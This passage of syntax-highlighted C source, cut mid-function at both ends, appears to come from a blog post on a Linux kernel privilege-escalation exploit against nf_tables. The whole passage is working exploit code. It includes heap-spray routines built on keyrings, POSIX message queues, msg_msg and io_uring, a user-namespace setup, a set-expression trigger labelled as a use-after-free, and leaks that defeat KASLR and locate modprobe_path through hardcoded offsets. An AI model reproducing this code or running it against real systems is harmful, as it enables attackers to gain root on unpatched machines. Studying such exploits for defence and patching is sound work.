 <span class="built_in">printf</span>(info, arg);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">key_serial_t</span> *<span class="title">spray_keyring</span><span class="params">(<span class="keyword">uint32_t</span> start, <span class="keyword">uint32_t</span> spray_size)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> key_desc[KEY_DESC_MAX_SIZE];</span><br><span class="line">    <span class="keyword">key_serial_t</span> *id_buffer = <span class="built_in">calloc</span>(spray_size, <span class="keyword">sizeof</span>(<span class="keyword">key_serial_t</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (id_buffer == <span class="literal">NULL</span>)</span><br><span class="line">        bye(<span class="string">&quot;calloc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = start; i &lt; start+spray_size; i++) &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(key_desc, KEY_DESC_MAX_SIZE, <span class="string">&quot;SPRAY-RING-%03du&quot;</span>, i);</span><br><span class="line">        id_buffer[i] = add_key(<span class="string">&quot;user&quot;</span>, key_desc, key_desc, <span class="built_in">strlen</span>(key_desc), KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">        <span class="keyword">if</span> (id_buffer[i] &lt; <span class="number">0</span>)</span><br><span class="line">            bye(<span class="string">&quot;add_key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> id_buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">key_serial_t</span> *<span class="title">spray_keyring_list_del_purpose</span><span class="params">(<span class="keyword">uint32_t</span> spray_size, <span class="keyword">uint64_t</span> next, <span class="keyword">uint64_t</span> prev, <span class="keyword">uint64_t</span> size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="comment">// next[0x8] = prev, prev[0x0] = next allocation occured at gather mqueue</span></span><br><span class="line">    <span class="keyword">char</span> key_desc[KEY_DESC_MAX_SIZE];</span><br><span class="line">    <span class="keyword">key_serial_t</span> *id_buffer = <span class="built_in">calloc</span>(spray_size, <span class="keyword">sizeof</span>(<span class="keyword">key_serial_t</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">0x20</span>];</span><br><span class="line">    <span class="built_in">memcpy</span>(temp+<span class="number">0x0</span>, &amp;next, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(temp+<span class="number">0x8</span>, &amp;prev, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(temp+<span class="number">0x10</span>, <span class="string">&quot;12341234&quot;</span>, <span class="number">8</span>);</span><br><span class="line">    <span class="built_in">memcpy</span>(temp+<span class="number">0x18</span>, &amp;size, <span class="number">8</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (id_buffer == <span class="literal">NULL</span>)</span><br><span class="line">        do_error_exit(<span class="string">&quot;calloc&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; spray_size; i++) &#123;</span><br><span class="line">        id_buffer[i] = add_key(<span class="string">&quot;user&quot;</span>, temp, temp, <span class="number">0x20</span>, KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">        <span class="keyword">if</span> (id_buffer[i] &lt; <span class="number">0</span>)</span><br><span class="line">            do_error_exit(<span class="string">&quot;add_key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> id_buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">key_serial_t</span> *<span class="title">spray_keyring_list_overwrite_purpose</span><span class="params">(<span class="keyword">uint32_t</span> spray_size, <span class="keyword">uint64_t</span> len, <span class="keyword">uint64_t</span> off_18, </span></span></span><br><span class="line"><span class="params"><span class="function">                                                    <span class="keyword">uint64_t</span> off_20, <span class="keyword">uint64_t</span> off_28, <span class="keyword">uint64_t</span> off_30, <span class="keyword">uint64_t</span> off_38)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> key_desc[KEY_DESC_MAX_SIZE];</span><br><span class="line">    <span class="keyword">key_serial_t</span> *id_buffer = <span class="built_in">calloc</span>(spray_size, <span class="keyword">sizeof</span>(<span class="keyword">key_serial_t</span>));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> temp[<span class="number">0x40</span>];</span><br><span class="line">    <span class="keyword">switch</span>((len<span class="number">-1</span>)/<span class="number">8</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">memcpy</span>(temp+<span class="number">0x0</span>, &amp;off_18, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">            <span class="built_in">memcpy</span>(temp+<span class="number">0x8</span>, &amp;off_20, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">            <span class="built_in">memcpy</span>(temp+<span class="number">0x10</span>, &amp;off_28, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">            <span class="built_in">memcpy</span>(temp+<span class="number">0x18</span>, &amp;off_30, <span class="number">8</span>);</span><br><span class="line">        <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">            <span class="built_in">memcpy</span>(temp+<span class="number">0x20</span>, &amp;off_38, <span class="number">8</span>);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">            bye(<span class="string">&quot;add_key - assert(len &lt;= 0x28)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; spray_size; i++) &#123;</span><br><span class="line">        <span class="built_in">snprintf</span>(key_desc, KEY_DESC_MAX_SIZE, temp);</span><br><span class="line">        id_buffer[i] = add_key(<span class="string">&quot;user&quot;</span>, temp, temp, len, KEY_SPEC_PROCESS_KEYRING);</span><br><span class="line">        <span class="keyword">if</span> (id_buffer[i] &lt; <span class="number">0</span>)</span><br><span class="line">            do_error_exit(<span class="string">&quot;add_key&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> id_buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">get_keyring_leak</span><span class="params">(<span class="keyword">key_serial_t</span> *id_buffer, <span class="keyword">uint32_t</span> id_buffer_size)</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">uint8_t</span> buffer[USHRT_MAX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int32_t</span> keylen;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; id_buffer_size; i++) &#123;</span><br><span class="line"></span><br><span class="line">        keylen = keyctl(KEYCTL_READ, id_buffer[i], (<span class="keyword">long</span>)buffer, <span class="number">0x10</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (keylen &lt; <span class="number">0</span>)</span><br><span class="line">            bye(<span class="string">&quot;keyctl&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(!<span class="built_in">strncmp</span>(&amp;buffer[<span class="number">6</span>],<span class="string">&quot;\xff\xff&quot;</span>, <span class="number">2</span>))</span><br><span class="line">        &#123;</span><br><span class="line">            heap_base = *((<span class="keyword">uint64_t</span>*)buffer);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] leak successed, kmalloc-64 heap: 0x%llx\n&quot;</span>, heap_base);</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[-] leak failed, idkval: %s\n&quot;</span>, buffer);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> id_buffer_size;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">awake_partial_keys</span><span class="params">(<span class="keyword">key_serial_t</span> *id_buffer, <span class="keyword">uint32_t</span> idx)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">uint8_t</span> buffer[USHRT_MAX] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    <span class="keyword">int32_t</span> keylen;</span><br><span class="line">    keylen = keyctl(KEYCTL_UPDATE, id_buffer[idx], (<span class="keyword">long</span>)buffer, <span class="number">0x10</span>, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">release_keys</span><span class="params">(<span class="keyword">key_serial_t</span> *id_buffer, <span class="keyword">uint32_t</span> id_buffer_size)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; id_buffer_size; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (keyctl(KEYCTL_REVOKE, id_buffer[i], <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">            do_error_exit(<span class="string">&quot;keyctl(KEYCTL_REVOKE)&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">free</span>(id_buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">release_partial_keys</span><span class="params">(<span class="keyword">key_serial_t</span> *id_buffer, <span class="keyword">int</span> i)</span> </span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (keyctl(KEYCTL_REVOKE, id_buffer[i], <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        do_error_exit(<span class="string">&quot;keyctl(KEYCTL_REVOKE)&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">unshare_setup</span><span class="params">(<span class="keyword">uid_t</span> uid, <span class="keyword">gid_t</span> gid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> temp;</span><br><span class="line">    <span class="keyword">char</span> edit[<span class="number">0x100</span>];</span><br><span class="line"></span><br><span class="line">    unshare(CLONE_NEWNS|CLONE_NEWUSER|CLONE_NEWNET);</span><br><span class="line"></span><br><span class="line">    temp = open(<span class="string">&quot;/proc/self/setgroups&quot;</span>, O_WRONLY);</span><br><span class="line">    write(temp, <span class="string">&quot;deny&quot;</span>, <span class="built_in">strlen</span>(<span class="string">&quot;deny&quot;</span>));</span><br><span class="line">    close(temp);</span><br><span class="line"></span><br><span class="line">    temp = open(<span class="string">&quot;/proc/self/uid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, uid);</span><br><span class="line">    write(temp, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(temp);</span><br><span class="line"></span><br><span class="line">    temp = open(<span class="string">&quot;/proc/self/gid_map&quot;</span>, O_WRONLY);</span><br><span class="line">    <span class="built_in">snprintf</span>(edit, <span class="keyword">sizeof</span>(edit), <span class="string">&quot;0 %d 1&quot;</span>, gid);</span><br><span class="line">    write(temp, edit, <span class="built_in">strlen</span>(edit));</span><br><span class="line">    close(temp);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_stable_table_and_set</span><span class="params">(struct mnl_socket* nl, <span class="keyword">const</span> <span class="keyword">char</span> *name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> * table_name = name;</span><br><span class="line">    <span class="keyword">char</span> * set_name = <span class="literal">NULL</span>;</span><br><span class="line">    <span class="keyword">uint8_t</span> family = NFPROTO_IPV4;</span><br><span class="line">    <span class="keyword">uint32_t</span> set_id = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// a table for the sets to be associated with</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_table</span> * <span class="title">table</span> =</span> nftnl_table_alloc();</span><br><span class="line">    nftnl_table_set_str(table, NFTNL_TABLE_NAME, table_name);</span><br><span class="line">    nftnl_table_set_u32(table, NFTNL_TABLE_FLAGS, <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_set</span> * <span class="title">set_stable</span> =</span>  nftnl_set_alloc();</span><br><span class="line">    set_name = <span class="string">&quot;set_stable&quot;</span>;</span><br><span class="line">    nftnl_set_set_str(set_stable, NFTNL_SET_TABLE, table_name);</span><br><span class="line">    nftnl_set_set_str(set_stable, NFTNL_SET_NAME, set_name);</span><br><span class="line">    nftnl_set_set_u32(set_stable, NFTNL_SET_KEY_LEN, <span class="number">1</span>);</span><br><span class="line">    nftnl_set_set_u32(set_stable, NFTNL_SET_FAMILY, family);</span><br><span class="line">    nftnl_set_set_u32(set_stable, NFTNL_SET_ID, set_id++);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// expressions</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_expr</span> * <span class="title">exprs</span>[128];</span></span><br><span class="line">    <span class="keyword">int</span> exprid = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// serialize</span></span><br><span class="line">    <span class="keyword">char</span> buf[MNL_SOCKET_BUFFER_SIZE*<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mnl_nlmsg_batch</span> * <span class="title">batch</span> =</span> mnl_nlmsg_batch_start(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">int</span> seq = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> * <span class="title">nlh</span>;</span></span><br><span class="line">    <span class="keyword">int</span> table_seq = seq;</span><br><span class="line"></span><br><span class="line">    nlh = nftnl_table_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),</span><br><span class="line">NFT_MSG_NEWTABLE, family, NLM_F_CREATE|NLM_F_ACK, seq++);</span><br><span class="line">    nftnl_table_nlmsg_build_payload(nlh, table);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// add set_stable</span></span><br><span class="line">    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),</span><br><span class="line">                                    NFT_MSG_NEWSET, family,</span><br><span class="line">                                    NLM_F_CREATE|NLM_F_ACK, seq++);</span><br><span class="line">    nftnl_set_nlmsg_build_payload(nlh, set_stable);</span><br><span class="line">    nftnl_set_free(set_stable);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nl == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mnl_socket_open&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] setting stable %s and set\n&quot;</span>, table_name);</span><br><span class="line">    <span class="keyword">if</span> (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),</span><br><span class="line">mnl_nlmsg_batch_size(batch)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mnl_socket_send&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_trigger_set_and_overwrite</span><span class="params">(struct mnl_socket* nl, <span class="keyword">const</span> <span class="keyword">char</span> *name, <span class="keyword">const</span> <span class="keyword">char</span> *set_name)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> * table_name = name;</span><br><span class="line">    <span class="keyword">uint8_t</span> family = NFPROTO_IPV4;</span><br><span class="line">    <span class="keyword">uint32_t</span> set_id = <span class="number">1</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_expr</span> * <span class="title">exprs</span>[128];</span></span><br><span class="line">    <span class="keyword">int</span> exprid = <span class="number">0</span>;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nlmsghdr</span> * <span class="title">nlh</span>;</span></span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">nftnl_set</span> * <span class="title">set_trigger</span> =</span> nftnl_set_alloc();</span><br><span class="line"></span><br><span class="line">    nftnl_set_set_str(set_trigger, NFTNL_SET_TABLE, table_name);</span><br><span class="line">    nftnl_set_set_str(set_trigger, NFTNL_SET_NAME, set_name);</span><br><span class="line">    nftnl_set_set_u32(set_trigger, NFTNL_SET_FLAGS, NFT_SET_EXPR);</span><br><span class="line">    nftnl_set_set_u32(set_trigger, NFTNL_SET_KEY_LEN, <span class="number">1</span>);</span><br><span class="line">    nftnl_set_set_u32(set_trigger, NFTNL_SET_FAMILY, family);</span><br><span class="line">    nftnl_set_set_u32(set_trigger, NFTNL_SET_ID, set_id);</span><br><span class="line">    exprs[exprid] = nftnl_expr_alloc(<span class="string">&quot;lookup&quot;</span>);</span><br><span class="line">    nftnl_expr_set_str(exprs[exprid], NFTNL_EXPR_LOOKUP_SET, <span class="string">&quot;set_stable&quot;</span>);</span><br><span class="line">    nftnl_expr_set_u32(exprs[exprid], NFTNL_EXPR_LOOKUP_SREG, NFT_REG_1);</span><br><span class="line">    nftnl_set_add_expr(set_trigger, exprs[exprid]);</span><br><span class="line">    exprid++;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">char</span> buf[MNL_SOCKET_BUFFER_SIZE*<span class="number">2</span>];</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">mnl_nlmsg_batch</span> * <span class="title">batch</span> =</span> mnl_nlmsg_batch_start(buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    <span class="keyword">int</span> seq = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    nftnl_batch_begin(mnl_nlmsg_batch_current(batch), seq++);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    nlh = nftnl_set_nlmsg_build_hdr(mnl_nlmsg_batch_current(batch),</span><br><span class="line">                                    NFT_MSG_NEWSET, family,</span><br><span class="line">                                    NLM_F_CREATE|NLM_F_ACK, seq++);</span><br><span class="line">    nftnl_set_nlmsg_build_payload(nlh, set_trigger);</span><br><span class="line">    nftnl_set_free(set_trigger);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    nftnl_batch_end(mnl_nlmsg_batch_current(batch), seq++);</span><br><span class="line">    mnl_nlmsg_batch_next(batch);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (nl == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mnl_socket_open&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (mnl_socket_sendto(nl, mnl_nlmsg_batch_head(batch),</span><br><span class="line">mnl_nlmsg_batch_size(batch)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        err(<span class="number">1</span>, <span class="string">&quot;mnl_socket_send&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] triggering UAF set and overwrite *(prevchunk+0x18)\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">set_cpu_affinity</span><span class="params">(<span class="keyword">int</span> cpu_n, <span class="keyword">pid_t</span> pid)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">cpu_set_t</span> <span class="built_in">set</span>;</span><br><span class="line"></span><br><span class="line">    CPU_ZERO(&amp;<span class="built_in">set</span>);</span><br><span class="line">    CPU_SET(cpu_n, &amp;<span class="built_in">set</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (sched_setaffinity(pid, <span class="keyword">sizeof</span>(<span class="built_in">set</span>), &amp;<span class="built_in">set</span>) &lt; <span class="number">0</span>)</span><br><span class="line">        do_error_exit(<span class="string">&quot;sched_setaffinity&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spray_mqueue</span><span class="params">(<span class="keyword">mqd_t</span> mqdes, <span class="keyword">char</span> *msgptr, <span class="keyword">int</span> spray_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> msgrv[BUFFER];</span><br><span class="line"><span class="keyword">unsigned</span> rvprio, sdprio = <span class="number">1</span>;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">timespec</span> <span class="title">ts</span>;</span></span><br><span class="line"><span class="keyword">int</span> unresolved = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> priority = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] spraying mqueue...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;spray_size; i++)</span><br><span class="line">        <span class="keyword">if</span> (mq_send(mqdes, msgptr, <span class="number">0x28</span>, sdprio) != <span class="number">0</span>)</span><br><span class="line">            perror(ERROR_PREFIX <span class="string">&quot;mq_send&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gather_mqueue</span><span class="params">(<span class="keyword">mqd_t</span> mqdes, <span class="keyword">int</span> gather_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> priority = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> msg[BUFFER];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] gathering mqueue...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;gather_size; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (mq_receive(mqdes, (<span class="keyword">char</span>*) &amp;msg, BUFFER, <span class="literal">NULL</span>) != <span class="number">-1</span>)</span><br><span class="line">        &#123;   </span><br><span class="line"></span><br><span class="line">            <span class="keyword">if</span>(*((<span class="keyword">uint64_t</span> *)msg) &amp; <span class="number">0xffffffff00000000</span> != <span class="number">0xffffffff00000000</span>)</span><br><span class="line">                bye(<span class="string">&quot;[-] can&#x27;t leak base... \n&quot;</span>);</span><br><span class="line"></span><br><span class="line">            base_base = *((<span class="keyword">uint64_t</span> *)msg) - <span class="number">0x51af80</span>;</span><br><span class="line">            modprobe_addr = base_base + <span class="number">0x1e8b320</span>;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] KASLR base: 0x%llx\n&quot;</span>, base_base);</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] modprobe addr: 0x%llx\n&quot;</span>, modprobe_addr);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">gather_mqueue_nosave</span><span class="params">(<span class="keyword">mqd_t</span> mqdes, <span class="keyword">int</span> gather_size)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> priority = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">char</span> msg[BUFFER];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] gathering mqueue...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;gather_size; i++)</span><br><span class="line">        mq_receive(mqdes, (<span class="keyword">char</span>*) &amp;msg, BUFFER, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">spray_msg_msg</span><span class="params">(<span class="keyword">unsigned</span> <span class="keyword">int</span> size, <span class="keyword">unsigned</span> <span class="keyword">int</span> amount, <span class="keyword">int</span> qid)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> buffer[<span class="number">0x2000</span>];</span><br><span class="line">    msg *spray = (msg *)buffer;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// assert(size &gt;= 0x31 &amp;&amp; size &lt;= 0x1000 - 0x8);</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[*] try to spray msg_msg\n&quot;</span>);</span><br><span class="line">    spray-&gt;mtype = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">memset</span>(spray-&gt;mtext, <span class="number">0x41</span>, size - <span class="number">0x30</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; amount; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span>(i % <span class="number">0x10</span> == <span class="number">0</span>)</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[*] spraying msg_msg: 0x%x\n&quot;</span>, i);</span><br><span class="line">        <span class="keyword">if</span> (msgsnd(qid, spray, size - <span class="number">0x30</span>, <span class="number">0</span>) == <span class="number">-1</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            perror(<span class="string">&quot;msgsend failure&quot;</span>);</span><br><span class="line">            <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">io_uring_setup</span><span class="params">(<span class="keyword">uint32_t</span> entries, struct io_uring_params *p)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_io_uring_setup, entries, p);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">inline</span> <span class="keyword">int</span> <span class="title">io_uring_register</span><span class="params">(<span class="keyword">int</span> fd, <span class="keyword">unsigned</span> <span class="keyword">int</span> opcode, <span class="keyword">void</span> *arg, <span class="keyword">unsigned</span> <span class="keyword">int</span> nr_args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> syscall(__NR_io_uring_register, fd, opcode, arg, nr_args);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function">struct fd_uring *<span class="title">spray_uring</span><span class="params">(<span class="keyword">uint32_t</span> spray_size, struct fd_uring *fd_buffer)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint64_t</span> i = <span class="number">0</span>; i &lt; spray_size; i++) &#123;</span><br><span class="line"></span><br><span class="line">        fd_buffer[i].params = <span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(struct io_uring_params));</span><br><span class="line">        <span class="keyword">if</span> (!fd_buffer[i].params)</span><br><span class="line">            do_error_exit(<span class="string">&quot;malloc&quot;</span>);</span><br><span class="line">        <span class="built_in">memset</span>(fd_buffer[i].params, <span class="number">0</span>, <span class="keyword">sizeof</span>(struct io_uring_params));</span><br><span class="line"></span><br><span class="line">        fd_buffer[i].fd = io_uring_setup(SPRAY_NB_ENTRIES, fd_buffer[i].params);</span><br><span class="line">        <span class="keyword">if</span> (fd_buffer[i].fd &lt; <span class="number">0</span>)</span><br><span class="line">            do_error_exit(<span class="string">&quot;io_uring_create&quot;</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> fd_buffer;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">release_uring</span><span class="params">(struct fd_uring *fd_buffer, <span class="keyword">uint32_t</span> buffer_size)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">uint32_t</span> i = <span class="number">0</span>; i &lt; buffer_size; i++) 